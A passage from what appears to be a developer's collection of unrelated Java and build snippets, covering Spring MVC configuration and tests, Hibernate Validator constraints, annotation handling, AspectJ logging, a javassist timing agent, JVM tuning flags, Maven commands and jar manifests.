            return outputDir;
        }
    });
}
--------------------------------------------------------------------------------------------------------
@Test
public void nestedViewResolverIsNotSpringBean() throws Exception {
	StaticWebApplicationContext webAppContext = new StaticWebApplicationContext();
	webAppContext.setServletContext(new MockServletContext());
	webAppContext.refresh();

	InternalResourceViewResolver nestedResolver = new InternalResourceViewResolver();
	nestedResolver.setApplicationContext(webAppContext);
	nestedResolver.setViewClass(InternalResourceView.class);
	viewResolver.setViewResolvers(new ArrayList<ViewResolver>(Arrays.asList(nestedResolver)));

	FixedContentNegotiationStrategy fixedStrategy = new FixedContentNegotiationStrategy(MediaType.TEXT_HTML);
	viewResolver.setContentNegotiationManager(new ContentNegotiationManager(fixedStrategy));

	viewResolver.afterPropertiesSet();

	String viewName = "view";
	Locale locale = Locale.ENGLISH;

	View result = viewResolver.resolveViewName(viewName, locale);
	assertNotNull("Invalid view", result);
}
--------------------------------------------------------------------------------------------------------
import de.flapdoodle.embed.process.config.store.FileType;
import de.flapdoodle.embed.process.extract.IExtractedFileSet;

import java.io.File;
import java.util.Collections;
import java.util.List;

/**
 * @author Ilya Sadykov
 */
public class EmptyFileSet implements IExtractedFileSet {
    @Override
    public File executable() {
        return null;
    }

    @Override
    public List<File> files(FileType type) {
        return Collections.emptyList();
    }

    @Override
    public File baseDir() {
        return null;
    }

    @Override
    public boolean baseDirIsGenerated() {
        return false;
    }
}


import ru.yandex.qatools.embed.postgresql.config.PostgresConfig;

public enum Command {
    Postgres("postgres", PostgresExecutable.class),
    InitDb("initdb", InitDbExecutable.class),
    CreateDb("createdb", CreateDbExecutable.class),
    PgCtl("pg_ctl", PgCtlExecutable.class),
    Psql("psql", PsqlExecutable.class),
    PgDump("pg_dump", PsqlExecutable.class),
    PgRestore("pg_restore", PsqlExecutable.class),
    Createuser("createuser", PsqlExecutable.class),
    ;

    private final String commandName;
    private final Class<? extends AbstractPGExecutable<PostgresConfig, ? extends AbstractPGProcess>> executableClass;

    Command(String commandName,
            Class<? extends AbstractPGExecutable<PostgresConfig, ? extends AbstractPGProcess>>
                    executableClass) {
        this.commandName = commandName;
        this.executableClass = executableClass;
    }

    public <E extends AbstractPGExecutable<PostgresConfig, P>, P extends AbstractPGProcess> Class<E> executableClass() {
        return (Class<E>) this.executableClass;
    }

    public String commandName() {
        return this.commandName;
    }
}
--------------------------------------------------------------------------------------------------------
	/**
	 * A simple parser for timeouts of format: 1d 2h 30m 15s.
	 */
	public static class SimpleTimeoutParser implements TimeoutParser {

		private static final String UNIT_PATTERN = "[a-zA-Z]+";
		private static final Pattern TIMEOUT_PATTERN = compile("(\\d+)\\s*("
				+ UNIT_PATTERN + ")");
		private Map<String, Long> units = new HashMap<>();

		public SimpleTimeoutParser() {
			addUnit("d", 24 * 3600).addUnit("h", 3600).addUnit("m", 60)
					.addUnit("s", 1);
		}

		private SimpleTimeoutParser addUnit(String unit, long value) {
			if (!unit.matches(UNIT_PATTERN)) {
				throw new TimeoutFormatException("Unit '" + unit
						+ "' must be a non-numeric word");
			}
			if (value < 0) {
				throw new TimeoutFormatException("Unit value '" + value
						+ "' cannot be negative");
			}
			units.put(unit, Long.valueOf(value));
			return this;
		}

		@Override
        public boolean isValid(String timeout) {
			return TIMEOUT_PATTERN.matcher(timeout).find();
		}

		@Override
        public long asSeconds(String timeout) {
			long total = 0;
			Matcher matcher = TIMEOUT_PATTERN.matcher(timeout);
			while (matcher.find()) {
				long value = Long.parseLong(matcher.group(1));
				String unit = matcher.group(2);
				if (!units.containsKey(unit)) {
					throw new TimeoutFormatException("Unrecognized unit: "
							+ unit);
				}
				total += units.get(unit).longValue() * value;
			}
			return total;
		}

	}
--------------------------------------------------------------------------------------------------------
mvn test -B -U -P CI
--------------------------------------------------------------------------------------------------------
import java.io.PrintStream;

import org.jbehave.core.reporters.Format;

public class PrintStreamAnnotationMonitor extends PrintingAnnotationMonitor {

    private final PrintStream output;

    public PrintStreamAnnotationMonitor() {
        this(System.out);
    }

    public PrintStreamAnnotationMonitor(PrintStream output) {
        this.output = output;
    }

    @Override
    protected void print(String format, Object... args) {
        Format.println(output, format, args);
    }

    @Override
    protected void printStackTrace(Throwable e) {
        e.printStackTrace(output);
    }
}

--------------------------------------------------------------------------------------------------------
import com.lankydan.rest.membership.GymMembershipController;
import com.lankydan.entity.person.Person;
import lombok.Getter;
import org.springframework.hateoas.Link;
import org.springframework.hateoas.ResourceSupport;

import static org.springframework.hateoas.mvc.ControllerLinkBuilder.linkTo;
import static org.springframework.hateoas.mvc.ControllerLinkBuilder.methodOn;

@Getter
public class PersonResource extends ResourceSupport {

  private final Person person;

  public PersonResource(final Person person) {
    this.person = person;
    final long id = person.getId();
    add(linkTo(PersonController.class).withRel("people"));
    add(linkTo(methodOn(GymMembershipController.class).all(id)).withRel("memberships"));
    add(linkTo(methodOn(PersonController.class).get(id)).withSelfRel());
  }
}
	@Override
	public void configureContentNegotiation(
			ContentNegotiationConfigurer configurer) {
		// Simple strategy: only path extension is taken into account
		configurer.favorPathExtension(true).
			ignoreAcceptHeader(true).
			useJaf(false).
			defaultContentType(MediaType.TEXT_HTML).
			mediaType("html", MediaType.TEXT_HTML).
			mediaType("xml", MediaType.APPLICATION_XML).
			mediaType("json", MediaType.APPLICATION_JSON);
	}
	
fdisk -l /dev/sda
--------------------------------------------------------------------------------------------------------
package org.hibernate.validator.referenceguide.chapter06.classlevel;

@Target({ TYPE, ANNOTATION_TYPE })
@Retention(RUNTIME)
@Constraint(validatedBy = { ValidPassengerCountValidator.class })
@Documented
public @interface ValidPassengerCount {

    String message() default "{org.hibernate.validator.referenceguide.chapter06.classlevel." +
            "ValidPassengerCount.message}";

    Class<?>[] groups() default { };

    Class<? extends Payload>[] payload() default { };
}
package org.hibernate.validator.referenceguide.chapter06.classlevel;

public class ValidPassengerCountValidator
        implements ConstraintValidator<ValidPassengerCount, Car> {

    @Override
    public void initialize(ValidPassengerCount constraintAnnotation) {
    }

    @Override
    public boolean isValid(Car car, ConstraintValidatorContext context) {
        if ( car == null ) {
            return true;
        }

        return car.getPassengers().size() <= car.getSeatCount();
    }
}

public class ValidPassengerCountValidator
        implements ConstraintValidator<ValidPassengerCount, Car> {

    @Override
    public void initialize(ValidPassengerCount constraintAnnotation) {
    }

    @Override
    public boolean isValid(Car car, ConstraintValidatorContext constraintValidatorContext) {
        if ( car == null ) {
            return true;
        }

        boolean isValid = car.getPassengers().size() <= car.getSeatCount();

        if ( !isValid ) {
            constraintValidatorContext.disableDefaultConstraintViolation();
            constraintValidatorContext
                    .buildConstraintViolationWithTemplate( "{my.custom.template}" )
                    .addPropertyNode( "passengers" ).addConstraintViolation();
        }

        return isValid;
    }
}

@Constraint(validatedBy = {
        ScriptAssertObjectValidator.class,
        ScriptAssertParametersValidator.class
})
@Target({ TYPE, FIELD, PARAMETER, METHOD, CONSTRUCTOR, ANNOTATION_TYPE })
@Retention(RUNTIME)
@Documented
public @interface ScriptAssert {

    String message() default "{org.hibernate.validator.referenceguide.chapter06." +
            "crossparameter.ScriptAssert.message}";

    Class<?>[] groups() default { };

    Class<? extends Payload>[] payload() default { };

    String script();

    ConstraintTarget validationAppliesTo() default ConstraintTarget.IMPLICIT;
}

@ScriptAssert(script = "arg1.size() <= arg0", validationAppliesTo = ConstraintTarget.PARAMETERS)
public Car buildCar(int seatCount, List<Passenger> passengers) {
    //...
}

@Inject
    @HibernateValidator
    private ValidatorFactory validatorFactory;

    @Inject
    @HibernateValidator
    private Validator validator;
	
	HibernateValidatorConfiguration configuration = Validation
        .byProvider( HibernateValidator.class )
        .configure();

ConstraintMapping constraintMapping = configuration.createConstraintMapping();

constraintMapping
    .type( Car.class )
        .property( "manufacturer", FIELD )
            .constraint( new NotNullDef() )
        .property( "licensePlate", FIELD )
            .ignoreAnnotations()
            .constraint( new NotNullDef() )
            .constraint( new SizeDef().min( 2 ).max( 14 ) )
    .type( RentalCar.class )
        .property( "rentalStation", METHOD )
                .constraint( new NotNullDef() );

Validator validator = configuration.addMapping( constraintMapping )
        .buildValidatorFactory()
        .getValidator();  
--------------------------------------------------------------------------------------------------------
import com.xala3pa.annotated.Annotated;
import com.xala3pa.annotations.Statistics;

import java.lang.reflect.Method;
import java.util.Collection;
import java.util.HashMap;
import java.util.Map;

public class AnnotationsUtils {
    public static void runAnnotation(Class<?> clazz, Map<String, Long> statistics) {
        Method[] methods = clazz.getMethods();

        for (Method method : methods) {
            if (method.isAnnotationPresent(Statistics.class)) {
                try {
                    calculateStatistics(statistics, method);
                    method.invoke(Annotated.class.newInstance(), "Alvaro\n");
                } catch (Exception e) {
                    System.err.println(e);
                }
            }
        }

    }

    private static void calculateStatistics(Map<String, Long> statistics, Method method) {
        String methodName = method.getName();
        Long count = statistics.getOrDefault(methodName, 0L);
        statistics.put(methodName, ++count);
    }
}

/**
 @Documented – indicates that elements using this annotation should be documented by javadoc and similar tools.
 This type should be used to annotate the declarations of types whose annotations affect the use of annotated
 elements by their clients. If a type declaration is annotated with Documented, its annotations become part of
 the public API of the annotated elements.
 @Target – indicates the kinds of program element to which an annotation type is applicable.
 Some possible values are TYPE, METHOD, CONSTRUCTOR, FIELD etc. If Target meta-annotation is not present,
 then annotation can be used on any program element.
 @Inherited – indicates that an annotation type is automatically inherited.
 If user queries the annotation type on a class declaration, and the class declaration has no annotation for this type,
 then the class’s superclass will automatically be queried for the annotation type.
 This process will be repeated until an annotation for this type is found, or the top of the class hierarchy (Object) is reached.
 @Retention – indicates how long annotations with the annotated type are to be retained.
 It takes RetentionPolicy argument whose Possible values are SOURCE, CLASS and RUNTIME
 */
@Documented
@Target(ElementType.METHOD)
@Retention(RetentionPolicy.RUNTIME)
@Inherited
public @interface Statistics {
}
--------------------------------------------------------------------------------------------------------
import java.lang.annotation.Annotation;
import java.lang.reflect.Array;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.util.Map;
import java.util.Objects;

final class JavannaInvocationHandler implements InvocationHandler {

    private static final Method EQUALS_METHOD;
    private static final Method HASHCODE_METHOD;
    private static final Method TO_STRING_METHOD;
    private static final Method ANNOTATION_TYPE_METHOD;

    static {
        try {
            EQUALS_METHOD = Object.class.getMethod( "equals", Object.class );
            HASHCODE_METHOD = Object.class.getMethod( "hashCode" );
            TO_STRING_METHOD = Object.class.getMethod( "toString" );
            ANNOTATION_TYPE_METHOD = Annotation.class.getMethod( "annotationType" );
        } catch ( NoSuchMethodException e ) {
            throw new IllegalStateException( "JVM does not provide expected method", e );
        }
    }

    private final JavaAnnotation<?> annotation;
    private final Map<String, ?> values;

    JavannaInvocationHandler( JavaAnnotation<?> annotation, Map<String, ?> values ) {
        this.annotation = annotation;
        this.values = values;
    }

    @Override
    public Object invoke( Object proxy, Method method, Object[] args ) throws Throwable {
        if ( method.equals( EQUALS_METHOD ) ) {
            Object other = args[ 0 ];
            return isEqual( other );
        }
        if ( method.equals( HASHCODE_METHOD ) ) {
            return annotation.hashCode() + values.hashCode();
        }
        if ( method.equals( TO_STRING_METHOD ) ) {
            return asString();
        }
        if ( method.equals( ANNOTATION_TYPE_METHOD ) ) {
            return annotation.getAnnotationType();
        }

        final String member = method.getName();
        Object value = values.get( member );

        if ( value == null ) {
            value = annotation.getDefaultValueByMember().get( member );
        }

        return cloneIfArray( value );
    }

    private Boolean isEqual( Object other ) {
        Class<? extends Annotation> type = annotation.getAnnotationType();

        if ( type.isInstance( other ) ) {
            Annotation otherAnnotation = type.cast( other );

            Map<String, Object> otherValues = Javanna.getAnnotationValues( otherAnnotation );

            return mapsAreEqual( values, otherValues );
        }

        return false;
    }

    private String asString() {
        StringBuilder builder = new StringBuilder();
        builder.append( annotation.getAnnotationType().getName() );
        builder.append( "(" );

        final int lastIndex = values.size();
        int index = 0;

        for (Map.Entry<String, ?> entry : values.entrySet()) {
            builder.append( entry.getKey() )
                    .append( "=" )
                    .append( valueAsString( entry.getValue() ) );

            if ( ++index != lastIndex ) {
                builder.append( ", " );
            }
        }

        builder.append( ")" );

        return builder.toString();
    }

    private static String valueAsString( Object value ) {
        // handle array of any type (Arrays.toString() requires us to know the type)
        if ( value.getClass().isArray() ) {
            int length = Array.getLength( value );
            StringBuilder builder = new StringBuilder();
            builder.append( "{" );
            for (int i = 0; i < length - 1; i++) {
                Object element = Array.get( value, i );
                builder.append( valueAsString( element ) ).append( ", " );
            }

            // last element, if any
            if ( length > 0 ) {
                builder.append( Array.get( value, length - 1 ) );
            }

            return builder.append( "}" ).toString();
        }
        return value.toString();
    }

    private static boolean mapsAreEqual( Map<String, ?> values, Map<String, Object> otherValues ) {
        if ( !values.keySet().equals( otherValues.keySet() ) ) {
            return false;
        }

        // keys are equal, now check each value

        for (Map.Entry<String, ?> entry : values.entrySet()) {
            Object value1 = entry.getValue();
            Object value2 = otherValues.get( entry.getKey() );
            if ( !valuesAreEqual( value1, value2 ) ) {
                return false;
            }
        }

        return true;
    }

    private static boolean valuesAreEqual( Object first, Object second ) {
        if ( first.getClass().isArray() ) {
            if ( second.getClass().isArray() ) {
                // both are arrays
                int length1 = Array.getLength( first );
                int length2 = Array.getLength( second );
                if ( length1 != length2 ) {
                    return false;
                }
                for (int i = 0; i < length1; i++) {
                    Object child1 = Array.get( first, i );
                    Object child2 = Array.get( second, i );
                    if ( !valuesAreEqual( child1, child2 ) ) {
                        return false;
                    }
                }

                // all elements are the same
                return true;
            } else {
                return false;
            }
        } else if ( second.getClass().isArray() ) {
            return false;
        } else {
            // none is an array
            return Objects.equals( first, second );
        }
    }

    @SuppressWarnings( "SuspiciousSystemArraycopy" )
    private static Object cloneIfArray( Object value ) {
        if ( value.getClass().isArray() ) {
            Class<?> type = value.getClass().getComponentType();
            int length = Array.getLength( value );
            Object clone = Array.newInstance( type, length );
            System.arraycopy( value, 0, clone, 0, length );
            return clone;
        } else {
            return value;
        }
    }
}

<dependency>
  <groupId>org.jetbrains</groupId>
  <artifactId>annotations</artifactId>
  <version>18.0.0</version>
</dependency>


import java.lang.annotation.Annotation;
import java.lang.annotation.ElementType;
import java.lang.annotation.Retention;
import java.lang.annotation.RetentionPolicy;
import java.lang.annotation.Target;
import java.util.List;

import com.almende.util.AnnotationUtil.AnnotatedClass;
import com.almende.util.AnnotationUtil.AnnotatedMethod;
import com.almende.util.AnnotationUtil.AnnotatedParam;

public class Example {
	public static void main(String args[]) {
		// Get annotated class from a Java class
		AnnotatedClass annotatedClass = AnnotationUtil.get(MyClass.class);
		
		// Get all class methods
		List<AnnotatedMethod> methods = annotatedClass.getMethods();
		for (AnnotatedMethod method : methods) {
			System.out.println("Method: " + method.getName());
			
			// get a particular method annotation
			Expose expose = method.getAnnotation(Expose.class);
			if (expose != null) {
				System.out.println("expose: " + expose.value());
			}
			
			// loop over all parameters
			List<AnnotatedParam> params = method.getParams();
			for (AnnotatedParam param : params) {
				// loop over all parameter annotations
				for (Annotation annotation : param.getAnnotations()) {
					System.out.println("Param annotation: " + annotation);
				}
			}
		}
	}

	class MyClass implements MyInterface {
		@Expose(true)
		public void myMethod(String a, String b) {
			// ...
		}
	}

	interface MyInterface {
		public void myMethod(@Name("a") String a, @Name("b") String b);
	}

	@Retention(RetentionPolicy.RUNTIME)
	@Target(value=ElementType.METHOD)
	public @interface Expose {
		boolean value();
	}

	@Retention(RetentionPolicy.RUNTIME)
	@Target(value=ElementType.PARAMETER)
	public @interface Name {
		String value();
	}
}

clean test -P test-functional
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
import java.util.logging.Level;
import java.util.logging.Logger;

import org.aspectj.lang.JoinPoint;
import org.aspectj.lang.ProceedingJoinPoint;
import org.aspectj.lang.annotation.After;
import org.aspectj.lang.annotation.AfterReturning;
import org.aspectj.lang.annotation.Around;
import org.aspectj.lang.annotation.Aspect;
import org.aspectj.lang.annotation.Pointcut;
import org.springframework.stereotype.Component;

@Component
@Aspect
public class LoggingAspect {

    private Logger logger = Logger.getLogger(LoggingAspect.class.getName());

    @Pointcut("within(ru.sysout.aspectsdemo.service.FullNameComposer)")
    public void stringProcessingMethods() {
    };

    @After("stringProcessingMethods()")
    public void logMethodCall(JoinPoint jp) {
        String methodName = jp.getSignature()
            .getName();

        logger.log(Level.INFO, "название метода: " + methodName);
    }

    @AfterReturning(pointcut = "execution(public String ru.sysout.aspectsdemo.service.FullNameComposer.*(..))", returning = "result")
    public void logAfterReturning(JoinPoint joinPoint, Object result) {

        logger.log(Level.INFO, "возвращенное значение: " + result.toString());
    }

    @Around("@annotation(LogExecutionTime)")
    public Object logExecutionTime(ProceedingJoinPoint joinPoint) throws Throwable {
        long start = System.currentTimeMillis();

        Object proceed = joinPoint.proceed();

        long executionTime = System.currentTimeMillis() - start;

        logger.log(Level.INFO, joinPoint.getSignature() + " выполнен за " + executionTime + "мс");
        return proceed;
    }
}
--------------------------------------------------------------------------------------------------------
#java -jar proguard\proguard-base-6.0.2.jar @L01.2.1.pro

-injars       target/L01.2.1.jar
-outjars      target/L01.2.1-out.jar

-printmapping pgmapout.map
-dontwarn

-keep public class ru.otus.l0111.Main {public static void main(java.lang.String[]);}
--------------------------------------------------------------------------------------------------------
 * To unzip the jar:
 * 7z x -oJAR ./target/L01.2.1.jar
 * unzip -d JAR ./target/L01.2.1.jar
 
  * mvn package
 * mvn clean compile
 * mvn assembly:single
 * mvn clean compile assembly:single
 
  * javap -c name.class
 * javap -v name.class
 
 /**
 * Created by tully.
 * <p>
 * Java 9 changes in logs:
 * https://dzone.com/articles/disruptive-changes-to-gc-logging-in-java-9
 */
/*
 -agentlib:jdwp=transport=dt_socket,address=14000,server=y,suspend=n
 -Xms512m
 -Xmx512m
 -XX:MaxMetaspaceSize=256m
 -XX:+UseConcMarkSweepGC
 -XX:+CMSParallelRemarkEnabled
 -XX:+UseCMSInitiatingOccupancyOnly
 -XX:CMSInitiatingOccupancyFraction=70
 -XX:+ScavengeBeforeFullGC
 -XX:+CMSScavengeBeforeRemark
 -XX:+UseParNewGC
 -verbose:gc
 -Xloggc:./logs/gc_pid_%p.log
 -XX:+PrintGCDateStamps
 -XX:+PrintGCDetails
 -XX:+UseGCLogFileRotation
 -XX:NumberOfGCLogFiles=10
 -XX:GCLogFileSize=1M
 -Dcom.sun.management.jmxremote.port=15000
 -Dcom.sun.management.jmxremote.authenticate=false
 -Dcom.sun.management.jmxremote.ssl=false
 -XX:+HeapDumpOnOutOfMemoryError
 -XX:HeapDumpPath=./dumps/
 
 #!/usr/bin/env bash

REMOTE_DEBUG="-agentlib:jdwp=transport=dt_socket,address=14025,server=y,suspend=n"
MEMORY="-Xms512m -Xmx512m -XX:MaxMetaspaceSize=256m"
GC="-XX:+UseConcMarkSweepGC -XX:+CMSParallelRemarkEnabled -XX:+UseCMSInitiatingOccupancyOnly -XX:CMSInitiatingOccupancyFraction=70 -XX:+ScavengeBeforeFullGC -XX:+CMSScavengeBeforeRemark -XX:+UseParNewGC"
GC_LOG=" -verbose:gc -Xloggc:./logs/gc_pid_%p.log -XX:+PrintGCDateStamps -XX:+PrintGCDetails -XX:+UseGCLogFileRotation -XX:NumberOfGCLogFiles=10 -XX:GCLogFileSize=100M"
JMX="-Dcom.sun.management.jmxremote.port=15025 -Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.ssl=false"
DUMP="-XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=./dumps/"

#-XX:OnOutOfMemoryError="kill -3 %p"

java $REMOTE_DEBUG $MEMORY $GC $GC_LOG $JMX $DUMP -jar target/L04.1-gc.jar > jvm.out

#!/usr/bin/env bash

mvn clean package

# linux
# cp target/root.war ~/apps/jetty/webapps/root.war

# windows
# copy target\root.war c:\Apps\Jetty\webapps\root.war
--------------------------------------------------------------------------------------------------------
import java.io.ByteArrayInputStream;
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.security.ProtectionDomain;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

//this class will be registered with instrumentation agent
public class DurationTransformer implements ClassFileTransformer {
	public byte[] transform(ClassLoader loader, String className,
			Class classBeingRedefined, ProtectionDomain protectionDomain,
			byte[] classfileBuffer) throws IllegalClassFormatException {
		byte[] byteCode = classfileBuffer;

		// since this transformer will be called when all the classes are
		// loaded by the classloader, we are restricting the instrumentation
		// using if block only for the Lion class
		if (className.equals("com/javapapers/java/instrumentation/Lion")) {
			System.out.println("Instrumenting......");
			try {
				ClassPool classPool = ClassPool.getDefault();
				CtClass ctClass = classPool.makeClass(new ByteArrayInputStream(
						classfileBuffer));
				CtMethod[] methods = ctClass.getDeclaredMethods();
				for (CtMethod method : methods) {
					method.addLocalVariable("startTime", CtClass.longType);
					method.insertBefore("startTime = System.nanoTime();");
					method.insertAfter("System.out.println(\"Execution Duration "
							+ "(nano sec): \"+ (System.nanoTime() - startTime) );");
				}
				byteCode = ctClass.toBytecode();
				ctClass.detach();
				System.out.println("Instrumentation complete.");
			} catch (Throwable ex) {
				System.out.println("Exception: " + ex);
				ex.printStackTrace();
			}
		}
		return byteCode;
	}
}
--------------------------------------------------------------------------------------------------------
/**
 * Created by tully.
 */
public class BaseThread extends Thread {

    public void run() {
        while (!CounterSemaphore.instance().stop()) {
            doSomething();
        }
    }

    protected void doSomething() {
       //business logic
    }

}


--------------------------------------------------------------------------------------------------------
import freemarker.template.Configuration;
import freemarker.template.Template;
import freemarker.template.TemplateException;

import java.io.IOException;
import java.io.StringWriter;
import java.io.Writer;
import java.util.Map;

/**
 * @author v.chibrikov
 */
class TemplateProcessor {
    private static final String HTML_DIR = "/tml/";

    private final Configuration configuration;

    public TemplateProcessor() throws IOException {
        configuration = new Configuration(Configuration.VERSION_2_3_28);
        configuration.setClassForTemplateLoading(this.getClass(), HTML_DIR);
        configuration.setDefaultEncoding("UTF-8");
    }

    String getPage(String filename, Map<String, Object> data) throws IOException {
        try (Writer stream = new StringWriter();) {
            Template template = configuration.getTemplate(filename);
            template.process(data, stream);
            return stream.toString();
        } catch (TemplateException e) {
            throw new IOException(e);
        }
    }
}
--------------------------------------------------------------------------------------------------------

    TemplateProcessor() throws IOException {
        configuration = new Configuration(Configuration.VERSION_2_3_28);
        configuration.setClassForTemplateLoading(this.getClass(), HTML_DIR);
        configuration.setDefaultEncoding("UTF-8");
    }
	
	       // Lambda
        Collections.sort(list, (String s1, String s2) -> {return s1.length() - s2.length();});

        // Типы выводятся
        Collections.sort(list, (s1, s2) -> {return s1.length() - s2.length();});

        Collections.sort(list, Comparator.comparingInt(s -> s.length()));
--------------------------------------------------------------------------------------------------------
    static void pool() throws Exception {
        System.out.println("pool()");
        ForkJoinPool fjPool = new ForkJoinPool(2);
        fjPool.submit(() -> {
            int result = IntStream.range(0, 5)
                    .parallel()
                    .peek(it -> System.out.printf("Thread [%s] peek: %d\n", Thread.currentThread().getName(), it))
                    .sum();
            System.out.println("sum: " + result);
        });
        fjPool.awaitTermination(1, TimeUnit.SECONDS);
    }
--------------------------------------------------------------------------------------------------------
package com.paragon.microservices.confirmationlink.callback.system.configuration;

import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.core.convert.ConversionService;
import org.springframework.core.convert.converter.Converter;
import org.springframework.core.convert.support.DefaultConversionService;
import org.springframework.web.client.RestTemplate;
import org.springframework.web.servlet.HandlerExceptionResolver;
import org.springframework.web.servlet.config.annotation.EnableWebMvc;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;
import org.springframework.web.servlet.mvc.support.DefaultHandlerExceptionResolver;

import java.util.List;

@Configuration
@EnableWebMvc
public class ConfirmationLinkCallbackConfiguration implements WebMvcConfigurer {

    @Bean
    public RestTemplate restTemplate() {
        return new RestTemplate();
    }

    @Bean
    public ConversionService conversionService(final List<Converter> converters) {
        final DefaultConversionService dcs = new DefaultConversionService();
        converters.forEach(dcs::addConverter);
        return dcs;
    }

    @Override
    public void configureHandlerExceptionResolvers(final List<HandlerExceptionResolver> exceptionResolvers) {
        exceptionResolvers.add(new DefaultHandlerExceptionResolver());
    }
}
--------------------------------------------------------------------------------------------------------
@ControllerAdvice("my.chosen.package")
@ControllerAdvice(value = "my.chosen.package")
@ControllerAdvice(basePackages = "my.chosen.package")
@ControllerAdvice(assignableTypes = MyController.class)
@ControllerAdvice(basePackageClasses = MyClass.class)

--------------------------------------------------------------------------------------------------------
@ControllerAdvice
public class GlobalExceptionHandler {
    /** Provides handling for exceptions throughout this service. */
    @ExceptionHandler({ UserNotFoundException.class, ContentNotAllowedException.class })
    public final ResponseEntity<ApiError> handleException(Exception ex, WebRequest request) {
        HttpHeaders headers = new HttpHeaders();

        if (ex instanceof UserNotFoundException) {
            HttpStatus status = HttpStatus.NOT_FOUND;
            UserNotFoundException unfe = (UserNotFoundException) ex;

            return handleUserNotFoundException(unfe, headers, status, request);
        } else if (ex instanceof ContentNotAllowedException) {
            HttpStatus status = HttpStatus.BAD_REQUEST;
            ContentNotAllowedException cnae = (ContentNotAllowedException) ex;

            return handleContentNotAllowedException(cnae, headers, status, request);
        } else {
            HttpStatus status = HttpStatus.INTERNAL_SERVER_ERROR;
            return handleExceptionInternal(ex, null, headers, status, request);
        }
    }

    /** Customize the response for UserNotFoundException. */
    protected ResponseEntity<ApiError> handleUserNotFoundException(UserNotFoundException ex, HttpHeaders headers, HttpStatus status, WebRequest request) {
        List<String> errors = Collections.singletonList(ex.getMessage());
        return handleExceptionInternal(ex, new ApiError(errors), headers, status, request);
    }

    /** Customize the response for ContentNotAllowedException. */
    protected ResponseEntity<ApiError> handleContentNotAllowedException(ContentNotAllowedException ex, HttpHeaders headers, HttpStatus status, WebRequest request) {
        List<String> errorMessages = ex.getErrors()
                .stream()
                .map(contentError -> contentError.getObjectName() + " " + contentError.getDefaultMessage())
                .collect(Collectors.toList());

        return handleExceptionInternal(ex, new ApiError(errorMessages), headers, status, request);
    }

    /** A single place to customize the response body of all Exception types. */
    protected ResponseEntity<ApiError> handleExceptionInternal(Exception ex, ApiError body, HttpHeaders headers, HttpStatus status, WebRequest request) {
        if (HttpStatus.INTERNAL_SERVER_ERROR.equals(status)) {
            request.setAttribute(WebUtils.ERROR_EXCEPTION_ATTRIBUTE, ex, WebRequest.SCOPE_REQUEST);
        }

        return new ResponseEntity<>(body, headers, status);
    }
}
--------------------------------------------------------------------------------------------------------
  .   ____          _            __ _ _
 /\\ / ___'_ __ _ _(_)_ __  __ _ \ \ \ \
( ( )\___ | '_ | '_| | '_ \/ _` | \ \ \ \
 \\/  ___)| |_)| | | | | || (_| |  ) ) ) )
  '  |____| .__|_| |_|_| |_\__, | / / / /
 =========|_|==============|___/=/_/_/_/
 :: Spring Boot ::        (v2.1.4.RELEASE)
--------------------------------------------------------------------------------------------------------
curl -X POST "http://vdlg-pba11-auth-1.pba.internal:20025/api/v1/crm-adapter/mails" -H "accept: application/json;charset=UTF-8" -H "Content-Type: application/json" -d "{ \"AttachedId\": [ \"string\" ], \"Locale\": \"string\", \"ResponseData\": {}, \"ResponseId\": \"string\", \"Subject\": \"string\", \"TemplateName\": \"string\", \"UserId\": \"string\"}"
--------------------------------------------------------------------------------------------------------
    ThreadFactory threadFactory =
        new ThreadFactory() {

          private final AtomicInteger threadNumber = new AtomicInteger(0);

          @Override
          public Thread newThread(@Nonnull Runnable r) {
            return new Thread(
                r, ThreadUtil.THREAD_NAME + "-PoolService-" + threadNumber.getAndIncrement());
          }
        };
--------------------------------------------------------------------------------------------------------
Manifest-Version: 1.0
Archiver-Version: Plexus Archiver
Created-By: Apache Maven
Built-By: ceki
Build-Jdk: 1.7.0_17
Bundle-Description: The slf4j API
Bundle-Version: 1.7.16
Implementation-Version: 1.7.16
X-Compile-Source-JDK: 1.5
X-Compile-Target-JDK: 1.5
Implementation-Title: slf4j-api
Bundle-ManifestVersion: 2
Bundle-SymbolicName: slf4j.api
Bundle-Name: slf4j-api
Bundle-Vendor: SLF4J.ORG
Bundle-RequiredExecutionEnvironment: J2SE-1.5
Export-Package: org.slf4j;version=1.7.16, org.slf4j.spi;version=1.7.16
 , org.slf4j.helpers;version=1.7.16, org.slf4j.event;version=1.7.16
Import-Package: org.slf4j.impl;version=1.6.0

Manifest-Version: 1.0
Ant-Version: Apache Ant 1.7.1
Created-By: 14.3-b01-101 (Apple Inc.)
Premain-Class: lombok.launch.Agent
Agent-Class: lombok.launch.Agent
Can-Redefine-Classes: true
Main-Class: lombok.launch.Main
Lombok-Version: 1.18.4

Manifest-Version: 1.0
Implementation-Title: opentest4j
Automatic-Module-Name: org.opentest4j
Build-Date: 2018-09-10
Bundle-SymbolicName: org.opentest4j
Implementation-Version: 1.1.1
Built-By: OTA4J Team
Bundle-ManifestVersion: 2
Bnd-LastModified: 1536606747000
Specification-Vendor: opentest4j.org
Specification-Title: opentest4j
Bundle-Vendor: opentest4j.org
Require-Capability: osgi.ee;filter:="(&(osgi.ee=JavaSE)(version=1.6))"
Tool: Bnd-2.4.0.201411031534
Implementation-Vendor: opentest4j.org
Export-Package: org.opentest4j;version="1.1.1"
Bundle-Version: 1.1.1
Bundle-Name: opentest4j
Build-Revision: 55cabbf7e6319c9dd5df68745e06824c50b6b2ef
Build-Time: 21:12:26.111+0200
Created-By: 1.8.0_162 (Oracle Corporation 25.162-b12)
Specification-Version: 1.1.1
--------------------------------------------------------------------------------------------------------
mvn clean install -Dspring.profiles.active="profile_name".
--------------------------------------------------------------------------------------------------------
@Test
public void whenExceptionThrown_thenAssertionSucceeds() {
    String test = null;
